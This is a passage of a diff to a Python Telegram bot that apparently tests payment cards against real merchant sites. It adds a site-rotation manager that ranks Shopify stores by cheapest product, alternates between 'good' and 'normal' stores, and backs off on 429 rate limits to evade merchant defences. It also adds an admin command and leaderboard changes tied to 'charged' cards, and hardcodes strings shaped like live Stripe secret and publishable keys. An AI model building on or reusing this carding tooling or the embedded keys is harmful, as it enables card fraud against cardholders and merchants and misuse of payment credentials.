@@ -4732,7 +4732,8 @@ from faker import Faker
 from datetime import datetime, timedelta
 
 # ============ CONFIGURATION ============
-
+STRIPE_SK = "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"
+STRIPE_PK = "pk_live_51ApfJGGX8lmJQndTjKrK7io1yUyrP72VJsWq9raw2VQMiL4o41dJEs3wyZphKW5CXx9z7zxJx2waMjUGU2jEVUL100UK0MU86s"
 BOUTIQUE_AMOUNT = 1000  # $10.00 in cents
 BOUTIQUE_CURRENCY = "aud"
 
@@ -12774,6 +12775,16 @@ class ShopifyAPIPool:
                     self.mark_api_result(api_name, False, elapsed, True)
                     # Continue to next attempt with different site/proxy
                     continue
+                
+                def handle_rate_limit(self, site: str, response_text: str):
+                    """
+                    Handle rate limit (429) by reporting to the rotation manager.
+                    """
+                    if "429" in response_text or "Site Error! Status: 429" in response_text:
+                        site_rotation_manager.record_rate_limit(site)
+                        print(f"🚫 [Rate Limit] 429 recorded for {site}")
+                        return True
+                    return False
                 
                 # ============ CHECK FOR 429 RATE LIMIT ============
                 is_rate_limit = "429" in response_text or "Site Error! Status: 429" in response_text
@@ -26151,272 +26162,319 @@ async def single_check_ezycourse(update: Update, context: ContextTypes.DEFAULT_T
         ezycourse_active_tasks.pop(user_id, None)
 
 
-# ============ SITE ROTATION MANAGER (NO COOLDOWN) ============
 
 # ============ SITE ROTATION MANAGER - GOOD SITES ONLY ============
 
+# ============ UPDATED SITE ROTATION MANAGER - 3 GOOD + 2 NORMAL PATTERN ============
+
 class SiteRotationManager:
     """
-    Manages site rotation - ONLY GOOD SITES (products under $5)
-    NO NORMAL SITES - GOOD SITES ONLY
+    Manages site rotation with pattern: 3 GOOD sites → 2 NORMAL sites → repeat
     """
     
     def __init__(self):
         self.good_sites_index = 0
+        self.normal_sites_index = 0
         self.good_sites_cache = []
-        self.normal_sites_cache = []  # Kept for reference but NOT used
+        self.normal_sites_cache = []
         self.cache_time = 0
-        self.cache_ttl = 30  # Refresh cache every 30 seconds
+        self.cache_ttl = 30
         
-        # Track last used site type (always "good" now)
+        # Rotation pattern: 3 GOOD, then 2 NORMAL, then repeat
+        self.pattern = ['good', 'good', 'good', 'normal', 'normal']
+        self.pattern_index = 0
+        
+        # 429 cooldown tracking
+        self.rate_limited_sites = {}  # site -> {'count': 0, 'cooldown_until': 0}
+        self.RATE_LIMIT_THRESHOLD = 3  # 3 consecutive 429 errors
+        self.RATE_LIMIT_COOLDOWN = 30  # 30 seconds cooldown
+        
         self.last_used_type = "good"
         
-        # Simple error tracking (just for logging, not for removal)
-        self.site_errors = {}  # site -> error_count (for logging only)
-        
-        print("🔄 Site Rotation Manager initialized - GOOD SITES ONLY MODE")
-        print("🌟 Only sites with products under $5 will be used")
-        print("🚫 Normal sites (products over $5) are IGNORED")
+        print("🔄 Site Rotation Manager initialized")
+        print("📊 Pattern: 3 GOOD → 2 NORMAL → repeat")
+        print("⏸️ 429 cooldown: 3 errors → 30s cooldown")
     
     def _get_good_sites(self) -> List[str]:
-        """
-        Get all GOOD sites sorted by price (lowest first)
-        ONLY sites with products under $5
-        """
+        """Get GOOD sites (under $5)"""
         now = time.time()
         
-        # Check cache
         if self.good_sites_cache and (now - self.cache_time) < self.cache_ttl:
             return self.good_sites_cache
         
-        # Get GOOD sites from site_quality_tracker
-        good_sites_with_prices = []
+        good_sites = site_quality_tracker.get_good_sites_sorted_by_price()
         
-        # Method 1: Get from site_quality_tracker.good_sites
-        for site in site_quality_tracker.good_sites:
-            price = site_quality_tracker.get_site_price(site)
-            if price > 0 and price < 5:  # Under $5
-                good_sites_with_prices.append((site, price))
-            elif price == 0:
-                # If no price data but marked GOOD, check if actually good
-                if site in autosopi_site_manager.sites:
-                    # Try to get price from site_quality_tracker
-                    stats = site_quality_tracker.site_quality.get(site, {})
-                    last_price = stats.get('last_price', 0)
-                    if last_price > 0 and last_price < 5:
-                        good_sites_with_prices.append((site, last_price))
-                        site_quality_tracker.price_cache[site] = last_price
-        
-        # Method 2: Check all sites in rotation for price under $5
-        for site in autosopi_site_manager.sites:
-            if site not in [s for s, _ in good_sites_with_prices]:
+        # Also check site_quality_tracker.good_sites
+        for site in list(site_quality_tracker.good_sites):
+            if site not in good_sites:
                 price = site_quality_tracker.get_site_price(site)
-                if price > 0 and price < 5:
-                    good_sites_with_prices.append((site, price))
-                    # Also add to good_sites set
-                    site_quality_tracker.good_sites.add(site)
-                    site_quality_tracker.price_cache[site] = price
+                if price < 5:
+                    good_sites.append(site)
         
-        # Method 3: Check site_quality_tracker.site_quality for price data
-        for site, stats in site_quality_tracker.site_quality.items():
-            if site not in [s for s, _ in good_sites_with_prices]:
-                lowest_price = stats.get('lowest_price', 0)
-                if lowest_price > 0 and lowest_price < 5:
-                    good_sites_with_prices.append((site, lowest_price))
-                    site_quality_tracker.good_sites.add(site)
-                    site_quality_tracker.price_cache[site] = lowest_price
+        # Remove duplicates and sort by price
+        good_sites = list(set(good_sites))
+        good_sites.sort(key=lambda s: site_quality_tracker.get_site_price(s))
         
-        # Remove duplicates
-        seen = set()
-        unique_good_sites = []
-        for site, price in good_sites_with_prices:
-            if site not in seen:
-                seen.add(site)
-                unique_good_sites.append((site, price))
-        
-        # Sort by price (lowest first)
-        unique_good_sites.sort(key=lambda x: x[1])
-        
-        # Update cache
-        self.good_sites_cache = [site for site, _ in unique_good_sites]
+        self.good_sites_cache = good_sites
         self.cache_time = now
         
-        # Also update site_quality_tracker.good_sites
-        for site, price in unique_good_sites:
-            if site not in site_quality_tracker.good_sites:
-                site_quality_tracker.good_sites.add(site)
-                site_quality_tracker.price_cache[site] = price
-        
-        # Print stats
         if self.good_sites_cache:
-            print(f"🌟 [Good Sites] Found {len(self.good_sites_cache)} GOOD sites")
-            for i, site in enumerate(self.good_sites_cache[:5], 1):
-                price = self._get_site_price(site)
-                print(f"   {i}. {site} (${price:.2f})")
-            if len(self.good_sites_cache) > 5:
-                print(f"   ... and {len(self.good_sites_cache) - 5} more")
-        else:
-            print("⚠️ [Good Sites] No GOOD sites found! Will try to auto-mark sites...")
-            self._auto_mark_good_sites()
+            print(f"🌟 [Good Sites] Found {len(self.good_sites_cache)} GOOD sites (under $5)")
         
         return self.good_sites_cache
     
-    def _get_site_price(self, site: str) -> float:
-        """Get site price from cache or tracker"""
-        if site in site_quality_tracker.price_cache:
-            return site_quality_tracker.price_cache[site]
-        
-        price = site_quality_tracker.get_site_price(site)
-        if price > 0:
-            site_quality_tracker.price_cache[site] = price
-            return price
-        
-        # Check site_quality_tracker.site_quality
-        stats = site_quality_tracker.site_quality.get(site, {})
-        lowest_price = stats.get('lowest_price', 0)
-        if lowest_price > 0:
-            site_quality_tracker.price_cache[site] = lowest_price
-            return lowest_price
-        
-        return 0
-    
-    def _auto_mark_good_sites(self):
-        """Auto-mark sites with products under $5 as GOOD"""
-        print("🔄 [Good Sites] Auto-marking sites with price under $5...")
-        marked = 0
-        
-        for site in autosopi_site_manager.sites:
-            price = self._get_site_price(site)
-            if price > 0 and price < 5:
-                site_quality_tracker.good_sites.add(site)
-                site_quality_tracker.price_cache[site] = price
-                marked += 1
-                print(f"   ✅ Auto-marked: {site} (${price:.2f})")
-        
-        if marked > 0:
-            site_quality_tracker.save_stats()
-            print(f"✅ Auto-marked {marked} sites as GOOD")
-        
-        # Refresh cache
-        self.good_sites_cache = list(site_quality_tracker.good_sites)
-        self.good_sites_cache.sort(key=lambda s: self._get_site_price(s))
-        self.cache_time = time.time()
-    
-    def get_next_site(self) -> Optional[str]:
-        """
-        Get next site - ONLY GOOD SITES
-        NO NORMAL SITES
-        """
-        # Get GOOD sites
-        good_sites = self._get_good_sites()
-        
-        # If no GOOD sites, try to auto-mark
-        if not good_sites:
-            print("⚠️ [Site Rotation] No GOOD sites available!")
-            self._auto_mark_good_sites()
-            good_sites = self._get_good_sites()
-            
-            if not good_sites:
-                print("❌ [Site Rotation] Still no GOOD sites!")
-                return None
-        
-        # Round-robin through GOOD sites
-        if self.good_sites_index >= len(good_sites):
-            self.good_sites_index = 0
-        
-        site = good_sites[self.good_sites_index]
-        self.good_sites_index += 1
-        
-        price = self._get_site_price(site)
-        print(f"🌟 [Site Rotation] GOOD site #{self.good_sites_index}/{len(good_sites)}: {site} (${price:.2f})")
-        
-        return site
-    
     def _get_normal_sites(self) -> List[str]:
-        """
-        Get normal sites (NOT GOOD) - FOR REFERENCE ONLY
-        These are NEVER used in rotation
-        """
-        all_sites = autosopi_site_manager.sites.copy()
-        good_sites = set(self._get_good_sites())
-        normal_sites = [s for s in all_sites if s not in good_sites]
-        return normal_sites
+        """Get NORMAL sites ($5-$10)"""
+        now = time.time()
+        
+        if self.normal_sites_cache and (now - self.cache_time) < self.cache_ttl:
+            return self.normal_sites_cache
+        
+        normal_sites = site_quality_tracker.get_normal_sites()
+        
+        # Also check site_quality_tracker.normal_sites
+        for site in list(site_quality_tracker.normal_sites):
+            if site not in normal_sites:
+                price = site_quality_tracker.get_site_price(site)
+                if 5 <= price < 10:
+                    normal_sites.append(site)
+        
+        # Remove duplicates and sort by price
+        normal_sites = list(set(normal_sites))
+        normal_sites.sort(key=lambda s: site_quality_tracker.get_site_price(s))
+        
+        self.normal_sites_cache = normal_sites
+        
+        if self.normal_sites_cache:
+            print(f"📌 [Normal Sites] Found {len(self.normal_sites_cache)} NORMAL sites ($5-$10)")
+        
+        return self.normal_sites_cache
     
-    def get_next_good_site_only(self) -> Optional[str]:
-        """Get next GOOD site only (for debugging)"""
+    def _is_site_on_cooldown(self, site: str) -> bool:
+        """Check if a site is on 429 cooldown"""
+        if site in self.rate_limited_sites:
+            cooldown_until = self.rate_limited_sites[site].get('cooldown_until', 0)
+            if time.time() < cooldown_until:
+                remaining = int(cooldown_until - time.time())
+                print(f"⏸️ [Cooldown] {site} on cooldown for {remaining}s")
+                return True
+            else:
+                # Cooldown expired - reset count
+                self.rate_limited_sites[site]['count'] = 0
+        return False
+    
+    def _get_next_good_site(self) -> Optional[str]:
+        """Get next GOOD site (skip cooldown sites)"""
         good_sites = self._get_good_sites()
-        return self._get_next_good_site(good_sites)
-    
-    def _get_next_good_site(self, good_sites: List[str]) -> Optional[str]:
-        """Get next GOOD site in round-robin"""
+        
         if not good_sites:
             return None
         
-        if self.good_sites_index >= len(good_sites):
-            self.good_sites_index = 0
+        # Try to find a non-cooldown site
+        for _ in range(len(good_sites) * 2):
+            if self.good_sites_index >= len(good_sites):
+                self.good_sites_index = 0
+            
+            site = good_sites[self.good_sites_index]
+            self.good_sites_index += 1
+            
+            # Also check if site exists in rotation
+            if site not in autosopi_site_manager.sites:
+                continue
+            
+            if not self._is_site_on_cooldown(site):
+                return site
         
-        site = good_sites[self.good_sites_index]
-        self.good_sites_index += 1
-        
-        return site
+        # All GOOD sites on cooldown - return None
+        return None
     
-    def record_site_result(self, site: str, success: bool, response_text: str = ""):
-        """
-        Record site result for tracking (NO REMOVAL - just logging)
-        Sites are NEVER removed from rotation
-        """
-        if site not in self.site_errors:
-            self.site_errors[site] = 0
+    def _get_next_normal_site(self) -> Optional[str]:
+        """Get next NORMAL site (skip cooldown sites)"""
+        normal_sites = self._get_normal_sites()
         
-        if success:
-            self.site_errors[site] = max(0, self.site_errors[site] - 1)
-            # Refresh cache to reflect any new GOOD sites
-            if site_quality_tracker.is_good_site(site):
-                self.cache_time = 0
-        else:
-            self.site_errors[site] += 1
-            # Only log, never remove
-            if self.site_errors[site] >= 5:
-                print(f"⚠️ [Site Warning] {site} has {self.site_errors[site]} errors (NOT removed)")
+        if not normal_sites:
+            return None
+        
+        for _ in range(len(normal_sites) * 2):
+            if self.normal_sites_index >= len(normal_sites):
+                self.normal_sites_index = 0
+            
+            site = normal_sites[self.normal_sites_index]
+            self.normal_sites_index += 1
+            
+            if site not in autosopi_site_manager.sites:
+                continue
+            
+            if not self._is_site_on_cooldown(site):
+                return site
+        
+        return None
     
-    def get_stats(self) -> str:
-        """Get site rotation statistics"""
+    def get_next_site(self) -> Optional[str]:
+        """
+        Get next site following pattern: 3 GOOD → 2 NORMAL → repeat
+        """
+        # Refresh caches
         good_sites = self._get_good_sites()
         normal_sites = self._get_normal_sites()
         
-        msg = "🔄 <b>Site Rotation Status (GOOD SITES ONLY)</b>\n\n"
-        msg += f"🌟 GOOD sites: {len(good_sites)}\n"
-        msg += f"📌 Normal sites (IGNORED): {len(normal_sites)}\n"
-        msg += f"📊 Total sites in rotation: {len(good_sites) + len(normal_sites)}\n"
-        msg += f"📌 GOOD index: {self.good_sites_index}/{len(good_sites)}\n"
-        msg += f"🔄 Last used: GOOD\n\n"
+        # If no GOOD sites, use NORMAL
+        if not good_sites:
+            print("⚠️ No GOOD sites available, using NORMAL sites")
+            site = self._get_next_normal_site()
+            if site:
+                print(f"📌 [Fallback] Using NORMAL site: {site}")
+                return site
+            # If no sites at all, try autosopi_site_manager
+            return autosopi_site_manager.get_next_site_weighted()
         
-        # Show next few GOOD sites
+        # If no NORMAL sites, use GOOD only
+        if not normal_sites:
+            print("⚠️ No NORMAL sites available, using GOOD only")
+            site = self._get_next_good_site()
+            if site:
+                print(f"🌟 [GOOD Only] Using GOOD site: {site}")
+                return site
+            return autosopi_site_manager.get_next_site_weighted()
+        
+        # Follow the pattern: 3 GOOD, 2 NORMAL, repeat
+        max_attempts = len(self.pattern) * 3
+        attempts = 0
+        
+        while attempts < max_attempts:
+            attempts += 1
+            
+            current_type = self.pattern[self.pattern_index % len(self.pattern)]
+            
+            if current_type == 'good':
+                site = self._get_next_good_site()
+                if site:
+                    self.pattern_index += 1
+                    price = site_quality_tracker.get_site_price(site)
+                    print(f"🌟 [GOOD #{self.good_sites_index}/{len(good_sites)}] {site} (${price:.2f})")
+                    return site
+                else:
+                    # No GOOD site available, try NORMAL
+                    print(f"⚠️ No GOOD sites available, trying NORMAL...")
+                    site = self._get_next_normal_site()
+                    if site:
+                        self.pattern_index += 1
+                        price = site_quality_tracker.get_site_price(site)
+                        print(f"📌 [NORMAL Fallback] {site} (${price:.2f})")
+                        return site
+                    else:
+                        # No sites at all
+                        return None
+            
+            else:  # normal
+                site = self._get_next_normal_site()
+                if site:
+                    self.pattern_index += 1
+                    price = site_quality_tracker.get_site_price(site)
+                    print(f"📌 [NORMAL #{self.normal_sites_index}/{len(normal_sites)}] {site} (${price:.2f})")
+                    return site
+                else:
+                    # No NORMAL site available, try GOOD
+                    print(f"⚠️ No NORMAL sites available, trying GOOD...")
+                    site = self._get_next_good_site()
+                    if site:
+                        self.pattern_index += 1
+                        price = site_quality_tracker.get_site_price(site)
+                        print(f"🌟 [GOOD Fallback] {site} (${price:.2f})")
+                        return site
+                    else:
+                        return None
+        
+        # Fallback to any available site
+        return autosopi_site_manager.get_next_site_weighted()
+    
+    def record_rate_limit(self, site: str):
+        """
+        Record a 429 rate limit error for a site.
+        After 3 consecutive 429 errors, add 30 second cooldown.
+        """
+        if site not in self.rate_limited_sites:
+            self.rate_limited_sites[site] = {'count': 0, 'cooldown_until': 0}
+        
+        self.rate_limited_sites[site]['count'] += 1
+        count = self.rate_limited_sites[site]['count']
+        
+        print(f"🚫 [429] {site} rate limit #{count}/{self.RATE_LIMIT_THRESHOLD}")
+        
+        if count >= self.RATE_LIMIT_THRESHOLD:
+            # Add cooldown
+            cooldown_until = time.time() + self.RATE_LIMIT_COOLDOWN
+            self.rate_limited_sites[site]['cooldown_until'] = cooldown_until
+            self.rate_limited_sites[site]['count'] = 0
+            print(f"⏸️ [Cooldown] {site} added to cooldown for {self.RATE_LIMIT_COOLDOWN}s")
+    
+    def record_site_result(self, site: str, success: bool, response_text: str = ""):
+        """
+        Record site result - reset 429 count on success
+        """
+        if success:
+            # Reset rate limit count on success
+            if site in self.rate_limited_sites:
+                self.rate_limited_sites[site]['count'] = 0
+                self.rate_limited_sites[site]['cooldown_until'] = 0
+        
+        # Check for 429 in response
+        if "429" in response_text or "Rate limit" in response_text:
+            self.record_rate_limit(site)
+    
+    def get_stats(self) -> str:
+        """Get rotation statistics"""
+        good_sites = self._get_good_sites()
+        normal_sites = self._get_normal_sites()
+        
+        msg = "🔄 <b>Site Rotation Status</b>\n\n"
+        msg += f"🌟 GOOD sites (under $5): {len(good_sites)}\n"
+        msg += f"📌 NORMAL sites ($5-$10): {len(normal_sites)}\n"
+        msg += f"📊 Pattern: 3 GOOD → 2 NORMAL → repeat\n"
+        msg += f"📌 Current pattern index: {self.pattern_index}/{len(self.pattern)}\n"
+        msg += f"🌟 GOOD index: {self.good_sites_index}/{len(good_sites)}\n"
+        msg += f"📌 NORMAL index: {self.normal_sites_index}/{len(normal_sites)}\n\n"
+        
+        # Show sites on cooldown
+        cooldown_sites = []
+        for site, data in self.rate_limited_sites.items():
+            if time.time() < data.get('cooldown_until', 0):
+                remaining = int(data['cooldown_until'] - time.time())
+                cooldown_sites.append((site, remaining))
+        
+        if cooldown_sites:
+            msg += f"⏸️ <b>Sites on 429 Cooldown:</b>\n"
+            for site, remaining in cooldown_sites:
+                msg += f"   • {site} ({remaining}s remaining)\n"
+        else:
+            msg += f"✅ No sites on cooldown\n"
+        
+        # Show next sites
         if good_sites:
-            msg += f"🌟 <b>Next GOOD sites (sorted by price):</b>\n"
-            for i in range(min(10, len(good_sites))):
+            msg += f"\n🌟 <b>Next GOOD sites:</b>\n"
+            for i in range(min(3, len(good_sites))):
                 idx = (self.good_sites_index + i) % len(good_sites)
                 site = good_sites[idx]
-                price = self._get_site_price(site)
+                price = site_quality_tracker.get_site_price(site)
                 msg += f"  {i+1}. {site} (${price:.2f})\n"
         
         if normal_sites:
-            msg += f"\n📌 <b>Normal sites (NOT used):</b>\n"
-            for site in normal_sites[:5]:
-                price = self._get_site_price(site)
-                msg += f"  • {site} (${price:.2f})\n"
-            if len(normal_sites) > 5:
-                msg += f"  ... and {len(normal_sites) - 5} more\n"
-        
-        msg += f"\n<i>⚠️ ONLY GOOD sites are used in rotation!</i>"
+            msg += f"\n📌 <b>Next NORMAL sites:</b>\n"
+            for i in range(min(3, len(normal_sites))):
+                idx = (self.normal_sites_index + i) % len(normal_sites)
+                site = normal_sites[idx]
+                price = site_quality_tracker.get_site_price(site)
+                msg += f"  {i+1}. {site} (${price:.2f})\n"
         
         return msg
     
     def reset_rotation(self):
         """Reset all rotation indices"""
         self.good_sites_index = 0
+        self.normal_sites_index = 0
+        self.pattern_index = 0
         self.cache_time = 0
-        print("🔄 Site rotation reset (GOOD sites only)")
+        print("🔄 Site rotation reset")
     
     def get_current_position(self) -> dict:
         """Get current rotation position"""
@@ -38398,8 +38456,8 @@ from datetime import datetime
 from user_agent import generate_user_agent
 
 # ============ CONFIGURATION ============
-STRIPE_SK = ""
-STRIPE_PK = ""
+STRIPE_SK = "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"
+STRIPE_PK = "pk_live_51ApfJGGX8lmJQndTjKrK7io1yUyrP72VJsWq9raw2VQMiL4o41dJEs3wyZphKW5CXx9z7zxJx2waMjUGU2jEVUL100UK0MU86s"
 
 # Active tasks for SK Gateway
 stripe_sk_active_tasks = {}
@@ -52124,7 +52182,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Premium emojis
     charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
     skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
-    trophy_emoji = premium_emoji(PREMIUM_EMOJI_IDS["trophy"], "🏆")
+    
     
     # Get top users from leaderboard
     period = 'alltime'
@@ -52137,7 +52195,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # If no data, show empty state
     if not top_users or "No data" in top_users:
         await update.message.reply_text(
-            f"{trophy_emoji} <b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
+            f"<b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
             f"━━━━━━━━━━━━━━━━\n"
             f"📊 <b>No data yet</b>\n\n"
             f"💡 Start checking cards to appear on the leaderboard!\n"
@@ -52197,7 +52255,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 })
     
     # Build the message
-    message = f"{trophy_emoji} <b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
+    message = f"<b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
     message += f"━━━━━━━━━━━━━━━━\n"
     message += f"🏆 Leaderboard - {period.upper()}\n\n"
     
@@ -52236,14 +52294,14 @@ async def refresh_stats_callback(update: Update, context: ContextTypes.DEFAULT_T
     # Premium emojis
     charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
     skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
-    trophy_emoji = premium_emoji(PREMIUM_EMOJI_IDS["trophy"], "🏆")
+    
     
     # Get top users from leaderboard
     top_users = leaderboard.get_top_users('alltime', 10)
     
     if not top_users or "No data" in top_users:
         await query.edit_message_text(
-            f"{trophy_emoji} <b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
+            f"<b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
             f"━━━━━━━━━━━━━━━━\n"
             f"📊 <b>No data yet</b>\n\n"
             f"{skull_emoji} <b>Dev</b> ➺ @lencax",
@@ -52297,7 +52355,7 @@ async def refresh_stats_callback(update: Update, context: ContextTypes.DEFAULT_T
                 })
     
     # Build the message
-    message = f"{trophy_emoji} <b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
+    message = f" <b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
     message += f"━━━━━━━━━━━━━━━━\n"
     message += f"🏆 Leaderboard - ALLTIME\n\n"
     
@@ -52326,7 +52384,7 @@ async def refresh_stats_callback(update: Update, context: ContextTypes.DEFAULT_T
     # Premium emojis
     charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
     skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
-    trophy_emoji = premium_emoji(PREMIUM_EMOJI_IDS["trophy"], "🏆")
+    
     
     # Get top 10 users from leaderboard
     leaderboard_text = leaderboard.get_top_users('alltime', 10)
@@ -52372,7 +52430,7 @@ async def refresh_stats_callback(update: Update, context: ContextTypes.DEFAULT_T
                 })
     
     # Build the message
-    message = f"{trophy_emoji} <b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
+    message = f"<b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
     message += f"━━━━━━━━━━━━━━━━\n"
     
     if users:
@@ -60141,51 +60199,156 @@ async def stripe_charge_v2_mass_check_logic(update: Update, context: ContextType
         
         
         
+async def normal_sites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show all NORMAL sites ($5-$10) - /normalsites"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    
+    # Only owner/admin can view NORMAL sites
+    if user_id != OWNER_ID:
+        await update.message.reply_text(
+            "❌ <b>Admin Only Command</b>\n\n"
+            "Only the bot owner can view NORMAL sites.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu()
+        )
+        return
+    
+    normal_sites = site_quality_tracker.get_normal_sites_sorted_by_price()
+    
+    if not normal_sites:
+        await update.message.reply_text(
+            "📋 <b>No NORMAL sites found</b>\n\n"
+            "NORMAL sites are sites with products priced between $5 and $10.\n\n"
+            "💡 Run <code>/chkadd</code> to find NORMAL sites.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu()
+        )
+        return
+    
+    msg = f"📌 <b>NORMAL Sites ($5-$10) - {len(normal_sites)}</b>\n\n"
+    msg += f"📊 These sites will be used as backup when GOOD sites are unavailable.\n"
+    msg += f"🔄 Rotation pattern: 3 GOOD → 2 NORMAL → repeat\n\n"
+    
+    for i, site in enumerate(normal_sites, 1):
+        price = site_quality_tracker.get_site_price(site)
+        in_rotation = "✅" if site in autosopi_site_manager.sites else "❌"
+        msg += f"{i}. {in_rotation} <code>{site}</code> - ${price:.2f}\n"
+    
+    msg += f"\n💡 <b>Total NORMAL sites:</b> {len(normal_sites)}"
+    
+    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+
+
 
 
 
 
 class SiteQualityTracker:
     """
-    Track site quality - ONLY mark as GOOD if price is UNDER $5.
-    CARD_DECLINED with price > $5 does NOT make a site GOOD.
+    Track site quality with three categories:
+    - GOOD: products under $5 (primary)
+    - NORMAL: products $5-$10 (backup)
+    - BAD: products over $10 or invalid
     """
     
     def __init__(self):
-        self.good_sites = set()  # Sites with products UNDER $5
-        self.bad_sites = set()   # Sites with products OVER $5
-        self.site_quality = {}   # site -> stats
-        self.price_cache = {}    # site -> lowest_price (cached for sorting)
+        self.good_sites: Set[str] = set()  # Products under $5
+        self.normal_sites: Set[str] = set()  # Products $5-$10 (backup)
+        self.bad_sites: Set[str] = set()  # Products over $10
+        self.site_quality: Dict[str, dict] = {}
+        self.price_cache: Dict[str, float] = {}
         self.load_stats()
-        
-        # Auto-clean on init
-        self._auto_clean_good_sites()
+        self._auto_clean_sites()
     
-    def _auto_clean_good_sites(self):
-        """Auto-remove sites with price >= $5 from GOOD list on init"""
+    def _auto_clean_sites(self):
+        """Auto-remove sites with price >= $10 from GOOD/NORMAL lists"""
         cleaned = 0
         for site in list(self.good_sites):
             price = self.get_site_price(site)
             if price >= 5:
                 self.good_sites.remove(site)
+                # If price is $5-$10, move to NORMAL
+                if 5 <= price < 10:
+                    self.normal_sites.add(site)
+                    print(f"🔄 [SITE QUALITY] Moved {site} from GOOD to NORMAL (${price:.2f})")
                 cleaned += 1
-                print(f"🧹 [SITE QUALITY] Auto-cleaned {site} from GOOD (price ${price:.2f} >= $5)")
+        
+        for site in list(self.normal_sites):
+            price = self.get_site_price(site)
+            if price >= 10:
+                self.normal_sites.remove(site)
+                cleaned += 1
+                print(f"🗑️ [SITE QUALITY] Removed {site} from NORMAL (${price:.2f} >= $10)")
         
         if cleaned > 0:
             self.save_stats()
-            print(f"🧹 Auto-cleaned {cleaned} expensive sites from GOOD list")
+            print(f"🧹 Auto-cleaned {cleaned} sites")
+    
+    def load_stats(self):
+        """Load site quality stats from file"""
+        if Path('site_quality.json').exists():
+            try:
+                with open('site_quality.json', 'r') as f:
+                    data = json.load(f)
+                    self.good_sites = set(data.get('good_sites', []))
+                    self.normal_sites = set(data.get('normal_sites', []))
+                    self.bad_sites = set(data.get('bad_sites', []))
+                    self.site_quality = data.get('site_quality', {})
+                    self.price_cache = data.get('price_cache', {})
+                
+                print(f"📊 Loaded site quality stats: {len(self.good_sites)} good, {len(self.normal_sites)} normal")
+            except Exception as e:
+                print(f"⚠️ Error loading site quality: {e}")
+        else:
+            print(f"📋 No site_quality.json found, starting fresh")
+    
+    def save_stats(self):
+        """Save site quality stats to file"""
+        try:
+            data = {
+                'good_sites': list(self.good_sites),
+                'normal_sites': list(self.normal_sites),
+                'bad_sites': list(self.bad_sites),
+                'site_quality': self.site_quality,
+                'price_cache': self.price_cache,
+                'timestamp': time.time()
+            }
+            with open('site_quality.json', 'w') as f:
+                json.dump(data, f, indent=2)
+            print(f"💾 Saved site quality stats: {len(self.good_sites)} good, {len(self.normal_sites)} normal")
+        except Exception as e:
+            print(f"⚠️ Error saving site quality: {e}")
+    
+    def get_site_price(self, site: str) -> float:
+        """Get the lowest price for a site"""
+        if site in self.price_cache:
+            return self.price_cache[site]
+        if site in self.site_quality:
+            return self.site_quality[site].get('lowest_price', 0)
+        return 0
+    
+    def get_site_price_rank(self, site: str) -> int:
+        """Get the price rank of a site (lower price = better rank)"""
+        sorted_sites = self.get_good_sites_sorted_by_price()
+        try:
+            return sorted_sites.index(site) + 1
+        except ValueError:
+            return len(sorted_sites) + 1
     
     def record_response(self, site: str, response_text: str, status_category: str, price: float = None):
         """
-        Record site response - ONLY mark as GOOD if price is UNDER $5.
-        CARD_DECLINED with price > $5 does NOT make a site GOOD.
+        Record site response - categorize as GOOD, NORMAL, or BAD based on price.
         """
         response_upper = response_text.upper()
         
-        # Initialize site_quality entry if not exists
+        # Initialize site_quality entry
         if site not in self.site_quality:
             self.site_quality[site] = {
                 'good_responses': 0,
+                'normal_responses': 0,
                 'bad_responses': 0,
                 'total_responses': 0,
                 'last_price': None,
@@ -60196,6 +60359,7 @@ class SiteQualityTracker:
                 'last_time': 0,
                 'all_responses': [],
                 'is_good': False,
+                'is_normal': False,
                 'price_history': [],
                 'first_seen': time.time(),
                 'last_seen': time.time()
@@ -60212,7 +60376,6 @@ class SiteQualityTracker:
             stats['last_price'] = price
             stats['price_history'].append(price)
             
-            # Track lowest price
             if price < stats['lowest_price']:
                 stats['lowest_price'] = price
                 self.price_cache[site] = price
@@ -60222,7 +60385,38 @@ class SiteQualityTracker:
             else:
                 stats['avg_price'] = (stats['avg_price'] + price) / 2
         
-        # ============ VALID RESPONSE INDICATORS ============
+        # If price is None but we have a valid response, try to extract from response
+        if price is None and response_text:
+            # Try to extract price from response
+            price_match = re.search(r'Price[\s]*:?\s*\$?(\d+\.?\d*)', response_text, re.IGNORECASE)
+            if price_match:
+                try:
+                    price = float(price_match.group(1))
+                    print(f"💰 [SITE QUALITY] Extracted price from response: ${price:.2f}")
+                except:
+                    pass
+            
+            # Also check in the response for "Price": value in JSON
+            if price is None:
